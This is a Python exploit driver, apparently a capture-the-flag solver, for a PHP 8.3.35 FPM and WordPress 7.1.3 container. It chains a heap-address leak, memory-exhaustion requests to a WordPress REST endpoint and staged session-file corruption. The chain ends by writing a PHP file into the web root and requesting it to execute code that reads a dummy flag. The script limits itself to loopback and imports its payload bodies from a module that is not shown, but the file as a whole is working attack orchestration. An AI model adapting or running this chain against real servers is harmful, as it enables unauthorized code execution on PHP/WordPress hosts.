#!/usr/bin/env python3
"""Loopback-only exploit replay for the pinned PHP 8.3.35 profile."""

from __future__ import annotations

import argparse
import hashlib
import http.client
import json
import os
import re
import secrets
import shlex
import string
import subprocess
import time
from pathlib import Path, PurePosixPath

from payloads import (
    BOUNDARY,
    NEUTRAL_SHA256,
    P_B_OFFSET,
    PAIR,
    PHP_FILENAME,
    Q_B_OFFSET,
    SCALAR,
    leak_body,
    leaked_base,
    neutral_body,
    producer_body,
    r2a_body,
    r2b_body,
    r3_body,
    seed_body,
    sha256,
)

HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18234
CONTAINER = "php2shell-fpm83"
DOCKER = ["docker"]
SID = ""
RUN_DIR: Path
EVENTS: list[dict[str, object]] = []

DUMMY_FLAG = b"hitcon{local_fpm83_dummy_do_not_submit}"
PRODUCER_PATH = "/wp-json/wp/v2/block-patterns/patterns"
SEED_NORMALIZED = (
    b'upload_progress_K|a:5:{s:10:"start_time";i:STAMP;s:14:"content_length";i:274131;'
    b's:15:"bytes_processed";i:5304;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{'
    b's:10:"field_name";s:1:"f";s:4:"name";s:5:"f.bin";s:8:"tmp_name";N;'
    b's:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:STAMP;'
    b's:15:"bytes_processed";i:5304;}}}'
)


def info(text: str) -> None:
    print(f"[*] {text}", flush=True)


def good(text: str) -> None:
    print(f"[+] {text}", flush=True)


def fresh_sid(length: int) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def docker(*args: str, timeout: int = 90) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(
        [*DOCKER, *args],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )


def docker_checked(*args: str, timeout: int = 90) -> bytes:
    result = docker(*args, timeout=timeout)
    if result.returncode:
        message = result.stderr.decode("utf-8", "replace")[:500]
        raise RuntimeError(f"docker {' '.join(args)} failed: {message}")
    return result.stdout


def read_file(path: str) -> bytes | None:
    result = docker("exec", CONTAINER, "cat", path)
    if result.returncode == 0:
        return result.stdout
    if b"No such file or directory" in result.stderr:
        return None
    raise RuntimeError(result.stderr.decode("utf-8", "replace")[:500])


def worker_pid() -> int:
    output = docker_checked("top", CONTAINER, "-eo", "pid,ppid,user,cmd")
    workers = []
    for line in output.decode("utf-8", "replace").splitlines():
        if "php-fpm: pool www" in line:
            workers.append(int(line.split()[0]))
    if len(workers) != 1:
        raise RuntimeError(f"expected one FPM worker, found {workers}")
    return workers[0]


def wait_worker() -> int:
    last_error: Exception | None = None
    for _ in range(40):
        try:
            return worker_pid()
        except RuntimeError as error:
            last_error = error
            time.sleep(0.25)
    raise RuntimeError(f"FPM worker did not appear: {last_error}")


def wait_replacement(old_pid: int) -> int:
    current = old_pid
    for _ in range(40):
        try:
            current = worker_pid()
        except RuntimeError:
            time.sleep(0.25)
            continue
        if current != old_pid:
            return current
        time.sleep(0.25)
    return current


def request(
    method: str,
    path: str,
    body: bytes | None = None,
    boundary: str | None = None,
    sid: str | None = None,
) -> tuple[int, bytes]:
    headers = {"Host": f"{HOST}:{PORT}"}
    if body is not None:
        if boundary is None:
            raise RuntimeError("multipart request is missing its boundary")
        headers["Content-Type"] = "multipart/form-data; boundary=" + boundary
        headers["Content-Length"] = str(len(body))
    if sid is not None:
        headers["Cookie"] = "PHPSESSID=" + sid
    connection = http.client.HTTPConnection(HOST, PORT, timeout=90)
    try:
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        return response.status, response.read()
    finally:
        connection.close()


def flush_log() -> None:
    (RUN_DIR / "manifest.json").write_text(
        json.dumps({"sid": SID, "events": EVENTS}, indent=2) + "\n"
    )


def note(stage: str, **values: object) -> None:
    EVENTS.append({"stage": stage, **values})
    flush_log()


def save(name: str, data: bytes) -> None:
    (RUN_DIR / name).write_bytes(data)


def exact_seed(data: bytes | None) -> bool:
    if data is None:
        return False
    normalized, count = re.subn(rb"i:\d{10};", b"i:STAMP;", data)
    return len(data) == 317 and count == 2 and normalized == SEED_NORMALIZED


def fingerprint() -> dict[str, object]:
    php = docker_checked("exec", CONTAINER, "php", "-r", "echo PHP_VERSION;").decode()
    wordpress = docker_checked(
        "exec",
        CONTAINER,
        "php",
        "-r",
        "include '/var/www/html/wp-includes/version.php'; echo $wp_version;",
    ).decode()
    ini = docker_checked(
        "exec",
        CONTAINER,
        "php",
        "-r",
        "echo ini_get('memory_limit'),'|',ini_get('session.upload_progress.enabled'),'|',ini_get('session.save_path');",
    ).decode()
    image = docker_checked(
        "inspect", CONTAINER, "--format", "{{.Image}}"
    ).decode().strip()
    facts = {
        "php": php,
        "wordpress": wordpress,
        "ini": ini,
        "container_image_id": image,
        "p_minus_b": hex(P_B_OFFSET),
        "q_minus_b": hex(Q_B_OFFSET),
        "calibration": "fixed to the pinned local image; no remote-host mode",
    }
    if php != "8.3.35" or wordpress != "7.1.3" or ini != "128M|1|/tmp":
        raise RuntimeError(f"unsupported FPM83 fingerprint: {facts}")
    return facts


def warm(label: str, expected_pid: int) -> bytes:
    status, response = request("GET", "/")
    save(f"{label}-warm.response.bin", response)
    actual_pid = worker_pid()
    note(
        f"{label}_warm",
        status=status,
        bytes=len(response),
        sha256=sha256(response),
        expected_pid=expected_pid,
        actual_pid=actual_pid,
    )
    if status != 200 or b"wp-content" not in response or actual_pid != expected_pid:
        raise RuntimeError(f"{label}: WordPress warm request changed")
    return response


def assert_target(expected: bytes | str) -> bytes:
    record = read_file("/tmp/sess_" + SID)
    if record is None:
        raise RuntimeError("target session file is absent")
    if expected == "seed":
        if not exact_seed(record):
            raise RuntimeError(f"seed session shape changed: {record[:120]!r}")
    elif record != expected:
        raise RuntimeError(f"target session mismatch: {record[:120]!r}")
    return record


def arm_producer(label: str, field_count: int, expected_pid: int, expected_record: bytes | str) -> None:
    body, boundary = producer_body(field_count)
    save(f"{label}-producer{field_count}.request.bin", body)
    status, response = request("POST", PRODUCER_PATH, body, boundary)
    save(f"{label}-producer{field_count}.response.bin", response)
    actual_pid = worker_pid()
    record = assert_target(expected_record)
    note(
        f"{label}_producer{field_count}",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        expected_pid=expected_pid,
        actual_pid=actual_pid,
        target_sha256=sha256(record),
    )
    if (
        status != 200
        or b"Allowed memory size of 134217728 bytes exhausted" not in response
        or b"functions.php</b> on line <b>655" not in response
        or actual_pid != expected_pid
    ):
        raise RuntimeError(f"{label}: producer{field_count} did not arm the expected worker")


def neutral_replace(expected_record: bytes | str | None) -> int:
    before = worker_pid()
    throw_sid = fresh_sid(15)
    if read_file("/tmp/sess_" + throw_sid) is not None:
        raise RuntimeError("neutral throwaway SID collision")
    body = neutral_body()
    if sha256(body) != NEUTRAL_SHA256:
        raise RuntimeError("neutral body digest changed")
    save("neutral.request.bin", body)
    status, response = request("POST", "/index.php", body, BOUNDARY.decode(), throw_sid)
    save("neutral.response.bin", response)
    after = wait_replacement(before)
    target = None if expected_record is None else assert_target(expected_record)
    note(
        "neutral",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        throw_sid=throw_sid,
        before_pid=before,
        after_pid=after,
        target_sha256=None if target is None else sha256(target),
    )
    if status != 200 or after == before or len(response) not in {0, 151}:
        raise RuntimeError("neutral request did not replace the FPM83 worker")
    return after


def bridge(label: str, expected_record: bytes | str) -> tuple[int, int]:
    record_before = assert_target(expected_record)
    pid = worker_pid()
    warm(label, pid)
    arm_producer(label, 22, pid, expected_record)

    leak_sid = fresh_sid(13)
    if read_file("/tmp/sess_" + leak_sid) is not None:
        raise RuntimeError("leak SID collision")
    body = leak_body()
    save(f"{label}-leak.request.bin", body)
    status, response = request("POST", "/index.php", body, BOUNDARY.decode(), leak_sid)
    save(f"{label}-leak.response.bin", response)
    base = leaked_base(response) if status == 200 else 0
    if status != 200 or worker_pid() != pid or assert_target(expected_record) != record_before:
        raise RuntimeError(f"{label}: heap leak changed the worker or target session")
    note(
        f"{label}_leak",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        leak_sid=leak_sid,
        B=f"0x{base:016x}",
        pid=pid,
    )

    arm_producer(label, 20, pid, expected_record)
    return base, pid


def seed() -> bytes:
    before = worker_pid()
    warm("seed", before)
    body, boundary = seed_body(SID)
    save("seed.request.bin", body)
    status, response = request("POST", "/index.php", body, boundary, SID)
    save("seed.response.bin", response)
    after = wait_replacement(before)
    record = assert_target("seed")
    save("seed.session.bin", record)
    note(
        "seed",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        session_bytes=len(record),
        session_sha256=sha256(record),
        before_pid=before,
        after_pid=after,
    )
    if status != 200 or after == before:
        raise RuntimeError("seed did not replace the worker")
    return record


def run_stage(label: str, base: int, pid: int, body: bytes, expected: bytes) -> bytes:
    save(f"{label}.request.bin", body)
    status, response = request("POST", "/index.php", body, BOUNDARY.decode(), SID)
    save(f"{label}.response.bin", response)
    record = assert_target(expected)
    save(f"{label}.session.bin", record)
    after = wait_replacement(pid)
    note(
        label,
        B=f"0x{base:016x}",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        session_sha256=sha256(record),
        before_pid=pid,
        after_pid=after,
    )
    if status != 200 or after == pid:
        raise RuntimeError(f"{label} saved its session but did not replace the worker")
    return record


def execute(target: str, marker: bytes, restart_at_start: bool) -> dict[str, object]:
    if restart_at_start:
        info("restarting the local FPM83 container")
        docker_checked("restart", CONTAINER, timeout=120)
        time.sleep(3)
    wait_worker()
    facts = fingerprint()
    note("preflight", **facts, pid=worker_pid())

    if read_file("/tmp/sess_" + SID) is not None:
        raise RuntimeError("target SID already exists")
    if read_file(target) is not None:
        raise RuntimeError("target proof path already exists")
    dummy = read_file("/flag")
    if dummy is None or marker not in dummy:
        raise RuntimeError("local dummy flag prerequisite is absent")

    neutral_replace(None)
    original = seed()

    base, pid = bridge("r2a-bridge", "seed")
    scalar = run_stage("r2a", base, pid, r2a_body(base), SCALAR)
    good("R2a saved the scalar session")

    base, pid = bridge("r2b-bridge", SCALAR)
    pair = run_stage("r2b", base, pid, r2b_body(base), PAIR)
    good("R2b saved the scalar + array session")

    base, pid = bridge("r3-bridge", PAIR)
    body = r3_body(base, target)
    save("r3.request.bin", body)
    status, response = request("POST", "/index.php", body, BOUNDARY.decode(), SID)
    save("r3.response.bin", response)
    written = read_file(target)
    target_record = assert_target(PAIR)
    if written is not None:
        save("r3.target.bin", written)
    note(
        "r3_write",
        B=f"0x{base:016x}",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        proof_bytes=None if written is None else len(written),
        proof_sha256=None if written is None else sha256(written),
        target_session_sha256=sha256(target_record),
        before_pid=pid,
        after_pid=worker_pid(),
    )
    if status != 200 or written is None or not written.startswith(PAIR) or written.count(PHP_FILENAME) != 1:
        raise RuntimeError("R3 did not write the expected PHP session payload")

    get_status, get_response = request("GET", "/" + PurePosixPath(target).name)
    save("r3.get.bin", get_response)
    success = get_status == 200 and marker in get_response and PHP_FILENAME not in get_response
    note(
        "r3_get",
        status=get_status,
        bytes=len(get_response),
        sha256=sha256(get_response),
        expected_marker_found=marker in get_response,
        literal_php_absent=PHP_FILENAME not in get_response,
        success=success,
    )
    if not success:
        raise RuntimeError("R3 proof did not execute the local dummy flag read")
    good(f"R3 executed {target}")

    return {
        "success": True,
        "profile": "fpm83",
        "fingerprint": facts,
        "B": f"0x{base:016x}",
        "sid": SID,
        "r2a_p_offset": hex(P_B_OFFSET),
        "r2b_p_offset": hex(P_B_OFFSET),
        "r3_q_offset": hex(Q_B_OFFSET),
        "seed_sha256": sha256(original),
        "scalar_sha256": hashlib.sha256(scalar).hexdigest(),
        "pair_sha256": hashlib.sha256(pair).hexdigest(),
        "target": target,
        "response_bytes": len(get_response),
        "response_sha256": sha256(get_response),
        "expected_marker": marker.decode("utf-8", "replace"),
    }


def show_plan(args: argparse.Namespace) -> None:
    sample_base = 0x7C7543800000
    target = args.target or "/var/www/html/r3-fpm83-plan.php"
    sid = args.sid or "f83plan00000001"
    seed_request, _ = seed_body(sid)
    plan = {
        "mode": "offline_plan",
        "profile": "PHP 8.3.35 / WordPress 7.1.3",
        "target": f"http://{args.host}:{args.port}",
        "container": args.container,
        "fixed_geometry": {"P_minus_B": hex(P_B_OFFSET), "Q_minus_B": hex(Q_B_OFFSET)},
        "payloads": {
            "seed": {"bytes": len(seed_request), "sha256": sha256(seed_request)},
            "neutral": {"bytes": len(neutral_body()), "sha256": sha256(neutral_body())},
            "leak": {"bytes": len(leak_body()), "sha256": sha256(leak_body())},
            "producer20": {"bytes": len(producer_body(20)[0]), "sha256": sha256(producer_body(20)[0])},
            "producer22": {"bytes": len(producer_body(22)[0]), "sha256": sha256(producer_body(22)[0])},
            "r2a": {"bytes": len(r2a_body(sample_base)), "sha256": sha256(r2a_body(sample_base))},
            "r2b": {"bytes": len(r2b_body(sample_base)), "sha256": sha256(r2b_body(sample_base))},
            "r3": {"bytes": len(r3_body(sample_base, target)), "sha256": sha256(r3_body(sample_base, target))},
        },
        "live_requests": 0,
    }
    print(json.dumps(plan, indent=2))


def main() -> None:
    global HOST, PORT, CONTAINER, DOCKER, SID, RUN_DIR, EVENTS

    parser = argparse.ArgumentParser()
    parser.add_argument("--execute", action="store_true")
    parser.add_argument("--restart-at-start", action="store_true")
    parser.add_argument("--accept-fixed-geometry", action="store_true")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18234)
    parser.add_argument("--container", default="php2shell-fpm83")
    parser.add_argument("--docker-command", default=os.environ.get("PHP2SHELL_DOCKER_CMD", "docker"))
    parser.add_argument("--sid")
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--target")
    parser.add_argument("--expected-marker", default=DUMMY_FLAG.decode())
    args = parser.parse_args()

    if args.host not in {"127.0.0.1", "localhost", "::1"}:
        parser.error("this solver only runs against loopback")
    if not 10_000 <= args.port <= 65_535:
        parser.error("the calibrated profile requires a five-digit loopback port")
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", args.container):
        parser.error("bad container name")
    docker_command = shlex.split(args.docker_command)
    if not docker_command:
        parser.error("empty Docker command")

    if not args.execute:
        show_plan(args)
        return
    if not args.accept_fixed_geometry:
        parser.error("--execute requires --accept-fixed-geometry for the pinned P/Q offsets")

    sid = args.sid or fresh_sid(15)
    if not re.fullmatch(r"[A-Za-z0-9]{15}", sid):
        parser.error("SID must be exactly 15 letters or digits")
    target = args.target or f"/var/www/html/r3-{sid}.php"
    if not target.startswith("/var/www/html/r3-") or not target.endswith(".php"):
        parser.error("target must be /var/www/html/r3-*.php")

    HOST = args.host
    PORT = args.port
    CONTAINER = args.container
    DOCKER = docker_command
    SID = sid
    RUN_DIR = (args.output_dir or HERE / "runs" / sid).resolve()
    EVENTS = []
    if RUN_DIR.exists():
        parser.error(f"output directory already exists: {RUN_DIR}")
    RUN_DIR.mkdir(parents=True)
    flush_log()
    info(f"artifacts: {RUN_DIR}")

    try:
        result = execute(target, args.expected_marker.encode(), args.restart_at_start)
        (RUN_DIR / "result.json").write_text(json.dumps(result, indent=2) + "\n")
        note("complete", **result)
        print(json.dumps(result, indent=2))
    except Exception as error:
        note("abort", error=f"{type(error).__name__}: {error}")
        raise


if __name__ == "__main__":
    main()
